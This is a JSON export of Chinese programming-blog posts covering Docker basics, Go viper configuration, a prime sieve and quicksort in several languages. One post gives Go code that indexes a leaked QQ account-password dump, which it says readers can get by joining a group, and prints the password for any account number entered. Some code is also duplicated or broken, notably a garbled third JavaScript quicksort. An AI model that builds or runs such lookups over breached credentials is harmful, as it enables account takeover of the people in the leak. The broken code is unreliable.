&#125;&#125;//!-startend","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"docker[3]-dockerrun","slug":"docker-3-dockerrun","date":"2019-02-12T14:57:32.000Z","updated":"2019-03-01T12:21:30.400Z","comments":true,"path":"2019/02/12/docker-3-dockerrun/","link":"","permalink":"https://dreamerjonson.com/2019/02/12/docker-3-dockerrun/","excerpt":"","text":"Docker hub:https://hub.docker.com/ 第一个docker命令 1&gt; docker run hello-world 输出： 1234567891011121314151617181920Hello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/engine/userguide/ 将文件快照加载到container中，执行指定命令，如 &gt; run hello-wold 重写指定命令 123456789101112131415$ docker run busybox echo hi herehi here$ docker run busybox lsbindevetchomeprocrootsystmpusrvar可以看出打印出的文件目录是运行的linux虚拟机的文件目录 查看运行中的container 1234&gt; docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES07615c2e850e busybox &quot;ping baidu.com&quot; 19 seconds ago Up 18 seconds confident_feynman 查看所有的container，包含以前运行过的。 1234567891011&gt; docker ps --allCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES07615c2e850e busybox &quot;ping baidu.com&quot; About a minute ago Up About a minute confident_feynmana043e6324f01 busybox &quot;ls&quot; 14 hours ago Exited (0) 14 hours ago quirky_hawkinga49540a381c4 busybox &quot;echo hi here&quot; 14 hours ago Exited (0) 14 hours ago silly_wozniak5e8d8cab229d hello-world &quot;/hello&quot; 14 hours ago Exited (0) 14 hours ago confident_poitras32e394eb48be elasticsearch:6.5.0 &quot;/usr/local/bin/dock…&quot; 2 weeks ago Exited (255) 40 hours ago 0.0.0.0:9200-&gt;9200/tcp, 9300/tcp sharp_sanderson26e7cfd18013 elasticsearch:6.5.0 &quot;/usr/local/bin/dock…&quot; 2 weeks ago Exited (137) 2 weeks ago upbeat_hawking3aef31dc5086 elasticsearch:6.5.0 &quot;/usr/local/bin/dock…&quot; 2 weeks ago Exited (137) 2 weeks ago trusting_bhabha813f5b2d17c5 hello-world &quot;/hello&quot; 2 weeks ago Exited (0) 2 weeks ago docker run docker run 命令本身运行了两条指令： docker create 以及dokcer start: 1234567891011121314151617181920212223242526$ docker create hello-world1a7fc1e876787a20d190187ba0ba6e83eda5f76b0401e9d511d2982f9d8533a6//-a的作用是将输出打印到终端中。$ docker start -a 1a7fc1e876787a20d190187ba0ba6e83eda5f76b0401e9d511d2982f9d8533a6Hello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/engine/userguide/ 删除废弃container 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ docker system pruneWARNING! This will remove: - all stopped containers - all networks not used by at least one container - all dangling images - all dangling build cacheAre you sure you want to continue? [y/N] yDeleted Containers:1a7fc1e876787a20d190187ba0ba6e83eda5f76b0401e9d511d2982f9d8533a6a043e6324f01a418a8c115b4b1cdddab0a10afff9bc9c5ee06a720219a4f1b1ca49540a381c4d7da4dfd1efb598a27c2db3574115b82b1b6d33c4f8390b5241e5e8d8cab229df7f2adcef62f344581fd7e9094fd93e26618d0999545cdc6d66e32e394eb48be7d5cd7b530a78559ab686f7cf9af88c2c7ae1fdc68e551ca5b3626e7cfd18013369a5bc8fed0b5612ad2703929f18c01cb50809274dde055ae663aef31dc5086b99029e3ecabc2f6ba0cb096000cf9e535d685d08e78de9db692813f5b2d17c5368e5c1804450da9aa054fe7072d89c64db0a77f347dd6b848ed0d47fb9e443b4e4630722e41ddcec47fe9d8c8f5488f26f68963ad110acc0601b0a0dac8a3ed04083591e959d339db4ba8a74cb311f793cbaa98e931e68bd333bd1c71df5bc48a49308bba863adf66d7c7400fe93936718afbac9c10255f2804585f744217f723b9c355720abed52bcf87d5bc9c6159c265b88b9659227411067a3fef3b2896bc383f28cb5f1374763b94c7503827fc5705b35442e842035ce5ad43464f85fcb2378435bdebbd2cd5c3232af2439bb934f9b0ccc1751d27e29704a5b4a90ba958d8d3b38d369adb81facd04914535fb77da220792cf011a49639102238917d07e0e44a6f052fc6919f3b7b71f55f170918d9c3d5646491277f039e50fa4f86b5a260dd472cbfae7a875410093a95bb349e5551156f88b71eb3d49e7c150cac80467f1eb66ceb2ea53fc06e855f3d7f93f1f41b781b956c071ba5f5d3dd19fba4734a9b3508f4b0fe9bce5fc3c993c08a29fe2f98e01c622f651fd9d9e75471a281b1388e9376492b0017055a613b833d40598a95b83d5c4c599f8564237f6ffc9b95f06bab040aedd465f915f8cc58abdf63fcf8346476cc3caf48f5791f55949dcbd3c4c010d3336877c9887f0a5a2a0973d1d06ede75f8bfe3aee61c2515fbcb95e8bbc631450037ed7c31df12084cb18fe6a7fcc44d9ba2f460336feb3c41a8449edf6938813055f4f1a54bca5ac0d4792ebf56c5b150e430175f73a66980a7976484b6165914dc2c92b3038de212ed3c8ada518b37473155bb9c44ff6e00236e1efff308c15ab2c325dca83dadcfa5436929fe53bca3c9bDeleted Networks:composer_defaultfrontend_defaultDeleted Images:deleted: sha256:976d4268d7fdf90cc93ec61f85f078927d36bdc67db90b499b89ccf1a055ef0adeleted: sha256:8a8ed4af849b7d02679d9b9e4fab2fc9127c767bb06663941cbd670a290e0164deleted: sha256:016d15cc49ebebae72ead1a301ff58d286452b4c41b6e55bf773c178dbca8e80deleted: sha256:d0ec57f38348b804f222f15580a90ccbd74b62edb7603c31ca93426b17273177deleted: sha256:d38bf24881b8a552e4860a522b855da7477c21d1afda8da134f58ae2385b5cb1deleted: sha256:a072b7745bf6bcaed809584e6c435a0b73c0bf7bcdc079cee7b1a0e3646bf99bdeleted: sha256:9dd54c53fb6a246adcb826eb42321be2f1bf37d61eb96180da2ba05b68d218d6deleted: sha256:1dfabb24d4d4a7f7b3ba2af8d5f58e4f16805c0e67e1337a6240d13402487b22deleted: sha256:a241c1a1c4a34e202c30a39f4bcba36ea2572b7707ce393d8d495c60f940218ddeleted: sha256:1611321909424f073c866daf57fe4d6fc3e5f49e34aeb2b2e0c37bc0c9f31333Total reclaimed space: 462.9MB 停止container docker stop 让程序自动停止，10秒钟后不停止即会调用docker kill docker kill 立即停止 12&gt; docker stop &lt;id&gt;&gt; docker kill &lt;id&gt; 打印日志 12345678$ docker create busybox echo hi there5795ad1cd0e25ff9601eef2fdb45a28ba7fc3f765a73b6b5513a7fcdd1a9b767$ docker start 5795ad1cd0e25ff9601eef2fdb45a28ba7fc3f765a73b6b5513a7fcdd1a9b7675795ad1cd0e25ff9601eef2fdb45a28ba7fc3f765a73b6b5513a7fcdd1a9b767$ docker logs 5795ad1cd0e25ff9601eef2fdb45a28ba7fc3f765a73b6b5513a7fcdd1a9b767hi there 执行命令在container中 it代表能够与键盘交互、i代表输入输出。 t代表好的格式化展示。 exec命令将redis-cli加入到container中 123456$ docker run redis$ docker exec -it 5f6f2e746bf4 redis-cli127.0.0.1:6379&gt; set myvalue 5OK127.0.0.1:6379&gt; get myvalue&quot;5&quot; sh在container中执行任意指令 1234567$ docker exec -it 5f6f2e746bf4 sh# ls# cd /# lsbin boot data dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var# redis-cli127.0.0.1:6379&gt; 构建自己的docker image 新建 Dockerfile文件 123456#使用存在的docker image作为基本,类似于一个初始的操作系统。FROM alpine#下载redis到container的文件fs系统中RUN apk add --update redis#告诉 image如何做 开启作为container的时候CMD [\"redis-server\"] 123456789101112131415161718$ docker build .Sending build context to Docker daemon 2.048kBStep 1/3 : FROM alpine ---&gt; 11cd0b38bc3cStep 2/3 : RUN apk add --update redis---&gt; Running in d92500442b84fetch http://dl-cdn.alpinelinux.org/alpine/v3.8/main/x86_64/APKINDEX.tar.gzfetch http://dl-cdn.alpinelinux.org/alpine/v3.8/community/x86_64/APKINDEX.tar.gz(1/1) Installing redis (4.0.11-r0)Executing redis-4.0.11-r0.pre-installExecuting redis-4.0.11-r0.post-installStep 3/3 : CMD [&quot;redis-server&quot;] ---&gt; Running in 0f7a29a04b04Removing intermediate container 0f7a29a04b04 ---&gt; 5a14153acdc5Successfully built 5a14153acdc5$ docker run 5a14153acdc5 当构建好，最后就会有一个image id，可以通过docker run 5a14153acdc5运行。 docker build cache docker build 时，拥有缓存机制。例如，如果在之前的基础上增加下面的命令： 命令行显示出： 12345678910Sending build context to Docker daemon 2.048kBStep 1/3 : FROM alpine ---&gt; 11cd0b38bc3cStep 2/3 : RUN apk add --update redis ---&gt; Using cache ---&gt; 50e12ffd3c2eStep 3/3 : CMD [&quot;redis-server&quot;] ---&gt; Using cache ---&gt; 44385ec8305bSuccessfully built 44385ec8305b 这是由于最后一次执行docker build时 前两条命令时完全一样的，就会使用到缓存机制。 12345678910111213141516171819下面的两个dockerfile文件在缓存机制上也是不一样的。FROM alpineRUN apk add --update redisRUN apk add --update gccCMD [&quot;redis-server&quot;]与FROM alpineRUN apk add --update gccRUN apk add --update redisCMD [&quot;redis-server&quot;] 自己的image打包 123456789101112131415$ docker build -t zhuimengshaonian/redis-test:latest .Sending build context to Docker daemon 2.048kBStep 1/4 : FROM alpine ---&gt; 11cd0b38bc3cStep 2/4 : RUN apk add --update redis ---&gt; Using cache ---&gt; 50e12ffd3c2eStep 3/4 : RUN apk add --update gcc ---&gt; Using cache ---&gt; 8abfafcb6590Step 4/4 : CMD [&quot;redis-server&quot;] ---&gt; Using cache ---&gt; 44385ec8305bSuccessfully built 44385ec8305bSuccessfully tagged zhuimengshaonian/redis-test:latest ##运行 1docker run zhuimengshaonian/redis-test 简单的docker web应用程序 package.json: 12345678&#123; \"dependencies\": &#123; \"express\": \"*\" &#125;, \"scripts\": &#123; \"start\": \"node index.js\" &#125; &#125; index.js: 1234567891011const express = require('express');const app = express();app.get('/', (req, res) =&gt; &#123; res.send('How are you doing');&#125;);app.listen(8080, () =&gt; &#123; console.log('Listening on port 8080');&#125;); Dockerfile: 12345678910111213# Specify a base image 预置docker包node中的imageFROM node:alpine# 当前工作路径 目的是将应用程序文件与其他文件分离分离WORKDIR /usr/app# Install some depenendencies# 添加当前目录中的文件到container中，并执行npm install命令COPY ./package.json ./RUN npm installCOPY ./ ./# Default command 开启container时候的start命令CMD [\"npm\", \"start\"] 打包 123456789101112131415161718192021222324252627282930$ docker build -t zhuimengshaonian/webtest:latest .Sending build context to Docker daemon 4.096kBStep 1/6 : FROM node:alpine ---&gt; 4e50ad7c0e0bStep 2/6 : WORKDIR /usr/app ---&gt; Running in 2cdc013a3181Removing intermediate container 2cdc013a3181 ---&gt; 2d21ad008a15Step 3/6 : COPY ./package.json ./ ---&gt; 3f2b0cf62e30Step 4/6 : RUN npm install ---&gt; Running in e9d76dc22840npm notice created a lockfile as package-lock.json. You should commit this file.npm WARN app No descriptionnpm WARN app No repository field.npm WARN app No license field.added 48 packages from 36 contributors and audited 121 packages in 6.418sfound 0 vulnerabilitiesRemoving intermediate container e9d76dc22840 ---&gt; ff47e69c4824Step 5/6 : COPY ./ ./ ---&gt; 14e12e344e93Step 6/6 : CMD [&quot;npm&quot;, &quot;start&quot;] ---&gt; Running in 31b6e275bb7cRemoving intermediate container 31b6e275bb7c ---&gt; e4c1d9cc8d2eSuccessfully built e4c1d9cc8d2eSuccessfully tagged zhuimengshaonian/webtest:latest 执行 端口转发,实际的8080端口映射docker中的8080端口。 123456$ docker run -p 8080:8080 zhuimengshaonian/webtest&gt; @ start /usr/app&gt; node index.jsListening on port 8080","categories":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://dreamerjonson.com/tags/docker/"}]},{"title":"go语言[3]-数据结构-递归树构建17亿数据的内存模型","slug":"golang-3-structure-Recursive-tree","date":"2019-02-12T10:09:02.000Z","updated":"2019-02-12T10:31:56.978Z","comments":true,"path":"2019/02/12/golang-3-structure-Recursive-tree/","link":"","permalink":"https://dreamerjonson.com/2019/02/12/golang-3-structure-Recursive-tree/","excerpt":"","text":"递归树 用递归的方式实现了一颗树状的结构，该模型可以处理上亿qq数据。 内存中查询10次既可以找到结果，速度非常快。虽然将数据全部放置在了内存中，但是内存的消耗应该是降低到了最低的。 相较于C语言，这段代码明显就要难看了很多。因为Go语言是类型安全的语言，安全的的背后就是效率的损失。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159/*Copyright © 2018 jonson功能：在上亿乱序的qq账号密码数据文件中构建递归树，能够在不到1秒的时间内查询出指定账号的密码。代码基于泄漏的qq老密，加群获取文件*/package mainimport ( \"bufio\" \"fmt\" \"log\" \"os\" \"strings\" \"unsafe\")var g_pp = make([]*[]*byte,10)func main() &#123; search()&#125;//初始化构建内存模型func init()&#123; fmt.Println(\"初始化开始\") file, err := os.Open(\"1E~001.txt\") if err != nil &#123; log.Fatal(err) &#125; defer file.Close() scanner := bufio.NewScanner(file) for scanner.Scan() &#123; str:= scanner.Text() if len(str) &lt;50&#123;//数据已经整理过，最多50位。 qq:= getQQ(str) //fmt.Println(qq) if len(qq)==10 &amp;&amp; isAllNum(qq)&#123; //递归树，将模型构建完毕。 assign(&amp;g_pp,11,qq,str) &#125; &#125; &#125; if err := scanner.Err(); err != nil &#123; log.Fatal(err) &#125; fmt.Println(\"初始化结束\")&#125;/*最重要的递归函数，pp指针。deep为深度，str为字符串，password为密码*/func assign(pp *[]*[]*byte, deep int, str string,password string) &#123; //最后一级指针时，开辟内存，存储密码。 if deep == 1 &#123; buf:= make([]*byte,10) (*pp)[getnum(str[10-deep])] = &amp;buf p:= (*string)(unsafe.Pointer((*pp)[getnum(str[10-deep])])) *p = password return &#125; //刚开始传递11级指针的地址，deep=11递归下去，可以省略，改为传递11级指针，deep=10。 if deep == 11 &#123; assign((*[]*[]*byte)(unsafe.Pointer(pp)), deep - 1, str,password); return &#125; //判断该指针是否为空。如1131052403，当deep=10时，取出第一个数字1.判断pp[1]是否为Nil，为Nil就说明从来没有出现过第10位为1的qq号。 //这时就会为pp[1]开辟10个指针大小的内存，初始化为空。 //如果已经存在就继续递归。 if (*pp)[getnum(str[10-deep])]!=nil&#123; assign((*[]*[]*byte)(unsafe.Pointer((*pp)[getnum(str[10-deep])])), deep - 1, str,password); &#125;else &#123; buf:= make([]*byte,10) (*pp)[getnum(str[10-deep])] = &amp;buf assign((*[]*[]*byte)(unsafe.Pointer((*pp)[getnum(str[10-deep])])), deep - 1, str,password); &#125;&#125;//字符转换为数字func getnum(u uint8) uint8&#123; return u - '0'&#125;//qq补齐位数，判断是否为数字，字符转换为数字，数字不足补充0的算法//获取QQ号 1131052403----qwerty//截取数字10位，不足的补0，//对于这个函数的改进，让我可以在查找qq函数时也可以用func getQQ(s string) string&#123; raw:= strings.Split(s,\"----\")[0] length := len(raw) if length &lt; 10 &#123; raw = strings.Repeat(\"0\",10-length) + raw &#125; return raw&#125;//判断qq全部为数字func isAllNum(qq string ) bool&#123; for _,ch := range qq&#123; if ch &lt; '0' || ch &gt; '9'&#123; return false &#125; &#125; return true&#125;/*根据初始化递归树的原理，我们可以明白判断是否存在的意义。如果在某一位出现了一个数字，其所在的指针为NULL，就说明在该位从来没有出现过这个数字。相反，如果存在该数字，就首先说明其每一位的指针都不为空。*/var flag = truevar findresult string = \"\"func isExit(pp *[]*[]*byte, deep int, str string) &#123; if deep == 1 &#123; if (*pp)[getnum(str[10-deep])]!=nil&#123; findresult = *(*string)(unsafe.Pointer((*pp)[getnum(str[10-deep])])) &#125; return &#125; if deep == 11 &#123; isExit((*[]*[]*byte)(unsafe.Pointer(pp)), deep - 1, str); return &#125; if flag &amp;&amp; (*pp)[getnum(str[10-deep])]!=nil&#123; isExit((*[]*[]*byte)(unsafe.Pointer((*pp)[getnum(str[10-deep])])), deep - 1, str); &#125;else &#123; flag = false return &#125;&#125;//查找qq号func search()&#123; input := bufio.NewScanner(os.Stdin) for input.Scan()&#123; flag = true findresult=\"\" qq:= input.Text() qq= getQQ(qq) fmt.Println(\"搜索qq号：\",qq) isExit(&amp;g_pp,11,qq) if isAllNum(qq) &amp;&amp; findresult!=\"\"&#123; fmt.Printf(\"结果为：%s\\n\",findresult) &#125; &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"},{"name":"数据结构","slug":"go/数据结构","permalink":"https://dreamerjonson.com/categories/go/数据结构/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"},{"name":"数据结构","slug":"数据结构","permalink":"https://dreamerjonson.com/tags/数据结构/"}]},{"title":"golang[2]-structure-prime","slug":"golang-2-structure-prime","date":"2019-02-11T08:38:44.000Z","updated":"2019-02-11T08:41:42.094Z","comments":true,"path":"2019/02/11/golang-2-structure-prime/","link":"","permalink":"https://dreamerjonson.com/2019/02/11/golang-2-structure-prime/","excerpt":"","text":"并发版go语言求素数 并发版go语言求素数，代码非常优美 1234567891011121314151617181920212223242526272829303132333435// A concurrent prime sievepackage mainimport \"fmt\"// Send the sequence 2, 3, 4, ... to channel 'ch'.func Generate(ch chan&lt;- int) &#123; for i := 2; ; i++ &#123; ch &lt;- i // Send 'i' to channel 'ch'. &#125;&#125;// Copy the values from channel 'in' to channel 'out',// removing those divisible by 'prime'.func Filter(in &lt;-chan int, out chan&lt;- int, prime int) &#123; for &#123; i := &lt;-in // Receive value from 'in'. if i%prime != 0 &#123; out &lt;- i // Send 'i' to 'out'. &#125; &#125;&#125;// The prime sieve: Daisy-chain Filter processes.func main() &#123; ch := make(chan int) // Create a new channel. go Generate(ch) // Launch Generate goroutine. for i := 0; i &lt; 10; i++ &#123; prime := &lt;-ch fmt.Println(prime) ch1 := make(chan int) go Filter(ch, ch1, prime) ch = ch1 &#125;&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[60]-viper","slug":"golang-60-viper","date":"2019-02-11T05:24:23.000Z","updated":"2019-02-11T06:06:58.198Z","comments":true,"path":"2019/02/11/golang-60-viper/","link":"","permalink":"https://dreamerjonson.com/2019/02/11/golang-60-viper/","excerpt":"","text":"简单的说，viper就是go语言中高效解决配置信息的:https://github.com/spf13/viper What is Viper? Viper is a complete configuration solution for Go applications including 12-Factor apps. It is designed to work within an application, and can handle all types of configuration needs and formats. It supports: setting defaults reading from JSON, TOML, YAML, HCL, and Java properties config files live watching and re-reading of config files (optional) reading from environment variables reading from remote config systems (etcd or Consul), and watching changes reading from command line flags reading from buffer setting explicit values Viper can be thought of as a registry for all of your applications configuration needs. Why Viper? When building a modern application, you don’t want to worry about configuration file formats; you want to focus on building awesome software. Viper is here to help with that. Viper does the following for you: Find, load, and unmarshal a configuration file in JSON, TOML, YAML, HCL, or Java properties formats. Provide a mechanism to set default values for your different configuration options. Provide a mechanism to set override values for options specified through command line flags. Provide an alias system to easily rename parameters without breaking existing code. Make it easy to tell the difference between when a user has provided a command line or config file which is the same as the default. Viper uses the following precedence order. Each item takes precedence over the item below it: explicit call to Set flag env config key/value store default Viper configuration keys are case insensitive. 用例1:读取环境变量信息 绑定变量名为id，前缀spf。则环境变量中设置时必须为SPF_ID 1234567viper.SetEnvPrefix(\"spf\") // 前缀、will be uppercased automaticallyviper.BindEnv(\"id\")os.Setenv(\"SPF_ID\", \"13\") // typically done outside of the app export SPF_ID=3000id := viper.Get(\"id\") // 13fmt.Println(id) 自动绑定： 123456 viper.SetEnvPrefix(`spf`)viper.AutomaticEnv()id := viper.Get(\"id\")fmt.Println(id) 用例2:读取配置文件信息 1234567891011121314151617&#123; \"debug\": true, \"server\": &#123; \"address\": \":9090\" &#125;, \"context\":&#123; \"timeout\":2 &#125;, \"database\": &#123; \"host\": \"mysql\", \"port\": \"3306\", \"user\": \"user\", \"pass\": \"password\", \"name\": \"article\" &#125;&#125; 1234567891011121314151617181920212223242526272829package mainimport ( \"fmt\" \"github.com/spf13/viper\")func main()&#123; viper.SetConfigFile(`config.json`) err := viper.ReadInConfig() if err != nil &#123; panic(err) &#125; if viper.GetBool(`debug`) &#123; fmt.Println(\"Service RUN on DEBUG mode\") &#125; dbHost := viper.GetString(`database.host`) dbPort := viper.GetString(`database.port`) dbUser := viper.GetString(`database.user`) dbPass := viper.GetString(`database.pass`) dbName := viper.GetString(`database.name`) connection := fmt.Sprintf(\"%s:%s@tcp(%s:%s)/%s\", dbUser, dbPass, dbHost, dbPort, dbName) fmt.Println(connection)&#125; 用例3:命令行参数： 12345678910111213141516171819package mainimport ( \"github.com/spf13/pflag\" \"github.com/spf13/viper\" \"fmt\")func main()&#123; pflag.Int(\"flagname\", 1234, \"help message for flagname\") pflag.Parse() viper.BindPFlags(pflag.CommandLine) i := viper.GetInt(\"flagname\") // retrieve values from viper instead of pflag fmt.Println(i)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言数据结构[1]--go实现快速排序的两种方式","slug":"golang-1-structure-quicksort","date":"2019-02-08T05:29:28.000Z","updated":"2019-03-10T05:31:33.090Z","comments":true,"path":"2019/02/08/golang-1-structure-quicksort/","link":"","permalink":"https://dreamerjonson.com/2019/02/08/golang-1-structure-quicksort/","excerpt":"","text":"前言 go实现快速排序的两种方式。借助Go语言slice本身的特点以及切割时的特性，在快速排序递归时，参数不用传递开始与结尾参数。 快速排序第一种方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/*Copyright © 2018 jonson*/package mainimport \"fmt\"//打印func show(arr []int)&#123; for i:=0;i&lt;len(arr);i++&#123; fmt.Println(arr[i]) &#125; fmt.Println(\"----------------------------------------------\")&#125;func main()&#123; k := []int&#123;1,3,2,4,9,2,6,5,4,8&#125; show(k) quicksort(k) show(k)&#125;func quicksort(arr []int)&#123; if len(arr) &gt;1&#123;//必须要长度大于1才有意义。 end := len(arr) i := 0 j := len(arr) for i&lt;j&#123; for i &lt; end-1&#123; i++ if arr[i] &lt;= arr[0]&#123; break &#125; &#125; for j&gt;0&#123; j-- if arr[j]&gt;=arr[0]&#123; break &#125; &#125; //如果i&lt;j，说明要将这两个元素交换 if i &lt; j&#123; temp :=arr[i] arr[i] = arr[j] arr[j] = temp &#125; &#125; //交换start和 j 。 到此为止， j之前为小于start元素的，j之后为大于start元素的。 tmp := arr[j] arr[j] = arr[0] arr[0] = tmp //递归下去 if j &gt;0 &#123; quicksort(arr[0:j]) &#125; if j+1 &lt; end&#123; quicksort(arr[j+1:end]) &#125; &#125;&#125; 快速排序第二种方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/*Copyright © 2018 jonson*/package mainimport \"fmt\"//打印func show(arr []int)&#123; for i:=0;i&lt;len(arr);i++&#123; fmt.Println(arr[i]) &#125; fmt.Println(\"----------------------------------------------\")&#125;func main()&#123; k := []int&#123;1,3,2,4,9,2,6,5,4,8&#125; show(k) quicksort(k) show(k)&#125;func quicksort(arr []int)&#123; if len(arr) &gt;1&#123;//必须要长度大于1才有意义。 end := len(arr) i := 0 j := len(arr) for i&lt;j&#123; for i &lt; end-1&#123; i++ if arr[i] &lt;= arr[0]&#123; break &#125; &#125; for j&gt;0&#123; j-- if arr[j]&gt;=arr[0]&#123; break &#125; &#125; //如果i&lt;j，说明要将这两个元素交换 if i &lt; j&#123; temp :=arr[i] arr[i] = arr[j] arr[j] = temp &#125; &#125; //交换start和 j 。 到此为止， j之前为小于start元素的，j之后为大于start元素的。 tmp := arr[j] arr[j] = arr[0] arr[0] = tmp //递归下去 if j &gt;0 &#123; quicksort(arr[0:j]) &#125; if j+1 &lt; end&#123; quicksort(arr[j+1:end]) &#125; &#125;&#125; c语言实现1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//打印void show(int *a,int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(\"%d\\n\", a[i]); &#125; printf(\"---------------------------\\n\");&#125;//快速排序,不仅要写出来，而且要优美//arr 为数组//start 为开始的元素的下标//end 为结束的元素的下标+1void quick_sort(int *arr, int start, int end)&#123; if (start &lt; end) //必须要开始的元素 &lt;结束的元素才有意义。 &#123; //赋值 int i = start; int j = end; //i在++，j在--。第一个do为当i&lt;j时就继续下去。 do &#123; do //此do一直让i++，直到，发现大于start的 &#123; i++; &#125; while (i &lt; end &amp;&amp; arr[i] &lt; arr[start]); do//此do一直让j--，直到，发现小于start的元素 &#123; j--; &#125; while (j&gt;start &amp;&amp; arr[j]&gt;arr[start]); //如果i&lt;j，说明要将这两个元素交换 if (i &lt; j) &#123; int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; while (i&lt;j); //交换start和 j 。 到此为止， j之前为小于start元素的，j之后为大于start元素的。 int temp = arr[j]; arr[j] = arr[start]; arr[start] = temp; //递归下去 quick_sort(arr, start, j); quick_sort(arr, j + 1, end); &#125;&#125;void main()&#123; int a[10] = &#123; 1,3,2,4,9,2,6,5,4,8 &#125;; show(a, 10); quick_sort(a, 0,10); show(a, 10); system(\"pause\");&#125; c语言实现2 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;//打印void show(int *a,int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(\"%d\\n\", a[i]); &#125; printf(\"---------------------------\\n\");&#125;//快速排序,不仅要写出来，而且要优美//arr 为数组//start 为开始的元素的下标//end 为结束的元素的下标+1void quick_sort2(int *arr, int start, int end)&#123; if (start &lt; end) &#123; //start &lt; end 才有进新下去的意义。 //i从第一个开始，记录下标。 int i = start; //从第二个元素开始，循环到末尾 for (int j = start+1; j &lt; end; j++) &#123; //一旦发现比其start小的 if (arr[j] &gt; arr[start]) &#123; //i++,很重要的一步，也就是让发现的小于start的数，依次放置在第2个，第3个....位置上。 i++; //交换 int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; ////交换start和i 。 到此为止， i之前为小于start元素的，i之后为大于start元素的。 int temp = arr[i]; arr[i] = arr[start]; arr[start] = temp; //递归 quick_sort2(arr, start, i); quick_sort2(arr, i+1, end); &#125;&#125;void main()&#123; int a[10] = &#123; 1,3,2,4,9,2,6,5,4,8 &#125;; show(a, 10); quick_sort2(a, 0,10); show(a, 10); system(\"pause\");&#125; JavaScript 语言实现 1234567891011121314151617function quickSort(arr) &#123; if (arr.length &lt;= 1) &#123; return arr; &#125; var pivotIndex = Math.floor(arr.length / 2); var pivot = arr.splice(pivotIndex, 1)[0]; var left = []; var right = []; for (var i = 0; i &lt; arr.length; i++) &#123; if (arr[i] &lt; pivot) &#123; left.push(arr[i]); &#125; else &#123; right.push(arr[i]); &#125; &#125; return quickSort(left).concat([pivot], quickSort(right));&#125; JavaScript 语言实现2 123456789101112131415161718192021222324252627282930313233//上面简单版本的缺点是，它需要Ω(n)的额外存储空间，也就跟归并排序一样不好。额外需要的存储器空间配置，在实际上的实现，也会极度影响速度和高速缓存的性能。function quickSort(array) &#123; // 交换元素位置 function swap(array, i, k) &#123; var temp = array[i]; array[i] = array[k]; array[k] = temp; &#125; // 数组分区，左小右大 function partition(array, left, right) &#123; var storeIndex = left; var pivot = array[right]; // 直接选最右边的元素为基准元素 for (var i = left; i &lt; right; i++) &#123; if (array[i] &lt; pivot) &#123; swap(array, storeIndex, i); storeIndex++; // 交换位置后，storeIndex 自增 1，代表下一个可能要交换的位置 &#125; &#125; swap(array, right, storeIndex); // 将基准元素放置到最后的正确位置上 return storeIndex; &#125; function sort(array, left, right) &#123; if (left &gt; right) &#123; return; &#125; var storeIndex = partition(array, left, right); sort(array, left, storeIndex - 1); sort(array, storeIndex + 1, right); &#125; sort(array, 0, array.length - 1); return array;&#125; JavaScript 语言实现3 1234567891011121314151617181920212223242526272829303132333435363738function quickSort(arr) &#123; return sort(arr, 0, arr.length - 1); function swap(arr, i, k) &#123; var temp = arr[i]; arr[i] = arr[k]; arr[k] = temp; &#125; function sort(arr, start, end) &#123; sort(arr, 0, arr.length - 1); return arr; function swap(arr, i, k) &#123; var temp = arr[i]; arr[i] = arr[k]; arr[k] = temp; &#125; function sort(arr, start, end) &#123; if (start &gt;= end) return; var pivot = arr[start], i = start + 1, k = end; while (true) &#123; while (arr[i] &lt; pivot) &#123; i++; &#125; while (arr[k] &gt; pivot) &#123; k--; &#125; if (i &gt;= k) &#123; break; &#125; swap(arr, i, k); &#125; swap(arr, start, k); sort(arr, start, Math.max(0, k - 1)); sort(arr, Math.min(end, k + 1), end); &#125; 